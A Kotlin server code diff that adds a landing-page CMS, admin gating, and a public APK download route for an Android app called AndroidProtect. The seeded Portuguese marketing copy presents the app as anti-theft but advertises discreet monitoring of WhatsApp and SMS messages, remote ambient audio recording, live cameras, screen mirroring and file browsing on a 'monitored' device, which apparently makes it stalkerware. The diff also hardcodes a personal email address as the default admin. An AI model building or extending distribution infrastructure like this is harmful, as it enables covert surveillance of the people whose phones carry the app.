@@ -197,6 +197,60 @@ object MessagesTable : Table("messages") {
     override val primaryKey = PrimaryKey(id)
 }
 
+// Single-row table (id is always 1) storing the public landing page content as a JSON blob.
+// Kept schema-free on purpose so admin-landing.js can add/edit fields without migrations.
+object LandingContentTable : Table("landing_content") {
+    val id = integer("id")
+    val contentJson = text("content_json")
+    val updatedAt = long("updated_at")
+    override val primaryKey = PrimaryKey(id)
+}
+
+val DEFAULT_LANDING_CONTENT = """
+{
+  "hero": {
+    "badge": "Segurança Antifurto Inteligente",
+    "title": "Proteja seu celular.\nRecupere o controle.",
+    "subtitle": "Monitore localização, capture fotos, grave áudio e proteja seus dados remotamente — tudo em tempo real, direto do seu painel.",
+    "ctaPrimary": "Baixar o App",
+    "ctaSecondary": "Ver Planos"
+  },
+  "stats": [
+    { "value": "100%", "label": "Discreto" },
+    { "value": "24/7", "label": "Monitoramento" },
+    { "value": "< 5s", "label": "Tempo de Resposta" }
+  ],
+  "carousel": [],
+  "videos": { "demo": [], "install": [] },
+  "features": [
+    { "icon": "fa-solid fa-location-crosshairs", "title": "Localização em Tempo Real", "description": "Acompanhe a posição exata do dispositivo no mapa, com histórico de rotas e ruas percorridas." },
+    { "icon": "fa-solid fa-camera-rotate", "title": "Câmeras Remotas", "description": "Ative a câmera frontal ou traseira e veja o que está acontecendo ao vivo, a qualquer momento." },
+    { "icon": "fa-solid fa-microphone", "title": "Áudio Ambiente", "description": "Grave o som do ambiente remotamente para saber exatamente o que está acontecendo perto do aparelho." },
+    { "icon": "fa-brands fa-whatsapp", "title": "Mensagens Monitoradas", "description": "Veja mensagens de WhatsApp e SMS recebidas e enviadas, tudo organizado como um chat." },
+    { "icon": "fa-solid fa-triangle-exclamation", "title": "Alarme Antifurto", "description": "Dispare sirene, flash e vibração remotamente para localizar o aparelho ou assustar quem o pegou." },
+    { "icon": "fa-solid fa-folder-open", "title": "Explorador de Arquivos", "description": "Navegue pelos arquivos do dispositivo remotamente e baixe o que precisar." },
+    { "icon": "fa-solid fa-desktop", "title": "Espelhamento de Tela", "description": "Veja a tela do dispositivo em tempo real, direto do seu painel." },
+    { "icon": "fa-solid fa-bell", "title": "Alertas Instantâneos", "description": "Receba notificações imediatas de eventos importantes no dispositivo monitorado." }
+  ],
+  "pricing": {
+    "note": "Cancele quando quiser. Sem fidelidade.",
+    "plans": [
+      { "id": "monthly", "name": "Mensal", "price": "29,90", "period": "/mês", "badge": "", "featured": false, "features": ["Monitoramento completo", "Localização em tempo real", "Câmeras e áudio remotos", "Suporte via WhatsApp"] },
+      { "id": "quarterly", "name": "Trimestral", "price": "79,90", "period": "/3 meses", "badge": "Economize 11%", "featured": false, "features": ["Tudo do plano Mensal", "Histórico de localização estendido", "Prioridade no suporte"] },
+      { "id": "semiannual", "name": "Semestral", "price": "139,90", "period": "/6 meses", "badge": "Mais Popular", "featured": true, "features": ["Tudo do plano Trimestral", "Backup de mídias na nuvem", "Múltiplos dispositivos"] },
+      { "id": "annual", "name": "Anual", "price": "239,90", "period": "/ano", "badge": "Economize 33%", "featured": false, "features": ["Tudo do plano Semestral", "Suporte prioritário 24/7", "Melhor custo-benefício"] }
+    ]
+  },
+  "apk": { "url": "", "version": "1.0.0", "size": "", "updatedAt": 0 },
+  "footer": {
+    "companyName": "AndroidProtect",
+    "tagline": "Proteção antifurto inteligente para o seu Android.",
+    "supportEmail": "suporte@appbr.pro",
+    "whatsapp": ""
+  }
+}
+""".trimIndent()
+
 @Serializable
 data class UserInfo(
     val id: Int,
@@ -293,6 +347,29 @@ fun getSessionUserId(call: io.ktor.server.application.ApplicationCall): Int? {
     }
 }
 
+// Landing-page CMS is restricted to a fixed allowlist of admin emails — registration is public,
+// so "any authenticated session" is not enough to gate edits to the public marketing site.
+val landingAdminEmails: Set<String> by lazy {
+    (System.getenv("LANDING_ADMIN_EMAILS") ?: "lrlucasrafael11@gmail.com")
+        .split(",").map { it.trim().lowercase() }.filter { it.isNotBlank() }.toSet()
+}
+
+// Validate the caller is both an authenticated session AND an allowlisted landing admin.
+// Responds 401/403 and returns null if not.
+suspend fun assertLandingAdmin(call: io.ktor.server.application.ApplicationCall): Int? {
+    val userId = getSessionUserId(call)
+    if (userId == null) {
+        call.respond(io.ktor.http.HttpStatusCode.Unauthorized, mapOf("error" to "Não autenticado"))
+        return null
+    }
+    val email = transaction { UsersTable.select { UsersTable.id eq userId }.firstOrNull()?.get(UsersTable.email) }
+    if (email == null || email.lowercase() !in landingAdminEmails) {
+        call.respond(io.ktor.http.HttpStatusCode.Forbidden, mapOf("error" to "Acesso restrito ao administrador"))
+        return null
+    }
+    return userId
+}
+
 @Serializable
 data class MessageItem(
     val id: Int,
@@ -342,12 +419,21 @@ fun initDatabase() {
     Database.connect(dataSource)
 
     transaction {
-        SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LogsTable, MessagesTable)
+        SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LogsTable, MessagesTable, LandingContentTable)
         SchemaUtils.createMissingTablesAndColumns(DevicesTable, MessagesTable) // migrate new columns on existing installs
 
         // Reset all devices to offline state initially on server start
         DevicesTable.update {
             it[DevicesTable.isOnline] = false
+        }
+
+        // Seed the landing page content row on first boot
+        if (LandingContentTable.select { LandingContentTable.id eq 1 }.count() == 0L) {
+            LandingContentTable.insert {
+                it[id] = 1
+                it[contentJson] = DEFAULT_LANDING_CONTENT
+                it[updatedAt] = System.currentTimeMillis()
+            }
         }
     }
 }
@@ -369,6 +455,27 @@ fun main() {
                 isLenient = true
                 ignoreUnknownKeys = true
             })
+        }
+
+        // Single app/container answering on three domains (Coolify routes all of them here):
+        //   androidprotect.appbr.pro → device dashboard (index.html, unchanged)
+        //   grampol.appbr.pro        → public marketing landing page
+        //   admpainel.appbr.pro      → landing-page admin CMS (session-gated, see assertLandingAdmin)
+        // Intercepted before routing so it can short-circuit "/" without clashing with staticFiles.
+        intercept(ApplicationCallPipeline.Plugins) {
+            if (call.request.path() == "/") {
+                val host = call.request.host()
+                val staticDir = File("server/src/main/resources/static")
+                val file = when {
+                    host.startsWith("grampol.") -> File(staticDir, "landing.html")
+                    host.startsWith("admpainel.") -> File(staticDir, "admin-landing.html")
+                    else -> null
+                }
+                if (file != null && file.exists()) {
+                    call.respondBytes(file.readBytes(), io.ktor.http.ContentType.Text.Html)
+                    finish()
+                }
+            }
         }
 
         routing {
@@ -489,6 +596,117 @@ fun main() {
                 val mapsKey = System.getenv("GOOGLE_MAPS_API_KEY") ?: ""
                 val mapboxToken = System.getenv("MAPBOX_TOKEN") ?: ""
                 call.respond(mapOf("mapsKey" to mapsKey, "mapboxToken" to mapboxToken))
+            }
+
+            // ── Landing Page CMS ──────────────────────────────────────────────
+
+            // Public: current landing page content (hero, carousel, videos, features, pricing, apk, footer)
+            get("/api/landing/content") {
+                val json = transaction {
+                    LandingContentTable.select { LandingContentTable.id eq 1 }.firstOrNull()?.get(LandingContentTable.contentJson)
+                } ?: DEFAULT_LANDING_CONTENT
+                call.respondText(json, io.ktor.http.ContentType.Application.Json)
+            }
+
+            // Admin-only: replace the entire landing page content JSON
+            post("/api/landing/content") {
+                if (assertLandingAdmin(call) == null) return@post
+                val body = try { call.receiveText() } catch (e: Exception) {
+                    return@post call.respond(io.ktor.http.HttpStatusCode.BadRequest, mapOf("error" to "Corpo inválido"))
+                }
+                // Validate it's well-formed JSON before persisting
+                try { Json.parseToJsonElement(body) } catch (e: Exception) {
+                    return@post call.respond(io.ktor.http.HttpStatusCode.BadRequest, mapOf("error" to "JSON inválido: ${e.message}"))
+                }
+                transaction {
+                    val updated = LandingContentTable.update({ LandingContentTable.id eq 1 }) {
+                        it[contentJson] = body
+                        it[updatedAt] = System.currentTimeMillis()
+                    }
+                    if (updated == 0) {
+                        LandingContentTable.insert {
+                            it[id] = 1
+                            it[contentJson] = body
+                            it[updatedAt] = System.currentTimeMillis()
+                        }
+                    }
+                }
+                call.respond(mapOf("success" to true))
+            }
+
+            // Admin-only: upload a carousel image, demo/install video, or the APK file.
+            // Mirrors the /upload/photo pattern (R2 with local disk fallback).
+            post("/api/landing/upload-asset") {
+                if (assertLandingAdmin(call) == null) return@post
+                val kind = call.request.queryParameters["kind"] ?: "image" // image | video | apk
+                val subDir = when (kind) {
+                    "video" -> "videos"
+                    "apk" -> "apk"
+                    else -> "images"
+                }
+                val multipart = call.receiveMultipart()
+                val assetsDir = File("uploads/landing/$subDir").apply { mkdirs() }
+                var savedFile: File? = null
+                var originalName = "asset"
+
+                try {
+                    multipart.forEachPart { part ->
+                        if (part is PartData.FileItem) {
+                            originalName = part.originalFileName ?: "asset"
+                            val ext = originalName.substringAfterLast('.', "bin").lowercase()
+                            val safeExt = if (isSafeFilename("x.$ext")) ext else "bin"
+                            val fileName = "${kind}_${System.currentTimeMillis()}.$safeExt"
+                            val file = File(assetsDir, fileName)
+                            part.streamProvider().use { input ->
+                                file.outputStream().use { output -> input.copyTo(output) }
+                            }
+                            savedFile = file
+                        }
+                        part.dispose()
+                    }
+                } catch (e: Exception) {
+                    println("UPLOAD/landing-asset: multipart error: ${e.message}")
+                    return@post call.respond(mapOf("success" to false, "error" to "Upload error"))
+                }
+
+                val file = savedFile ?: return@post call.respond(mapOf("success" to false, "error" to "No file received"))
+                var fileUrl = "/uploads/landing/$subDir/${file.name}"
+                val client = s3Client
+                if (client != null) {
+                    try {
+                        val r2Key = "uploads/landing/$subDir/${file.name}"
+                        val contentType = getContentType(file.extension)
+                        val putReq = PutObjectRequest.builder()
+                            .bucket(r2BucketName)
+                            .key(r2Key)
+                            .contentType(contentType)
+                            .build()
+                        client.putObject(putReq, RequestBody.fromFile(file))
+                        fileUrl = "$r2PublicUrl/$r2Key"
+                        file.delete()
+                        println("R2 STORAGE: Landing asset uploaded and cleaned locally: $r2Key")
+                    } catch (e: Exception) {
+                        println("R2 STORAGE: Failed to upload landing asset to R2: ${e.message}. Keeping local file.")
+                    }
+                }
+                call.respond(mapOf("success" to true, "url" to fileUrl, "originalName" to originalName))
+            }
+
+            // Public: stable download link — always points at whatever APK is currently configured,
+            // so external links/buttons never break when the file is replaced.
+            get("/download/apk") {
+                val json = transaction {
+                    LandingContentTable.select { LandingContentTable.id eq 1 }.firstOrNull()?.get(LandingContentTable.contentJson)
+                } ?: DEFAULT_LANDING_CONTENT
+                val apkUrl = try {
+                    Json.parseToJsonElement(json).asObjectOrNull()
+                        ?.get("apk")?.asObjectOrNull()
+                        ?.get("url")?.jsonPrimitive?.content
+                } catch (e: Exception) { null }
+                if (apkUrl.isNullOrBlank()) {
+                    return@get call.respond(io.ktor.http.HttpStatusCode.NotFound, mapOf("error" to "APK não disponível ainda"))
+                }
+                call.respondRedirect(apkUrl, permanent = false)
             }
 
             // REST endpoint to list photos and audios for a device (returns full URLs)
